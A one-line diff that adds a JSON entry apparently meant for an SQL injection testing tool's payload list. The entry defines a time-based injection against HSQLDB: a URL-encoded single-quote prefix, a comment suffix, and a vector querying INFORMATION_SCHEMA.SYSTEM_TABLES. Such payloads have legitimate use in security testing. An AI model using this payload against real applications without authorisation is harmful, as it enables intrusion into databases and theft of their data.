@@ -1,0 +1,1 @@
+{"dbms": "hsqldb", "technique": "time", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SYSTEM_TABLES)", "comment": "hsqldb time: url-enc single"}
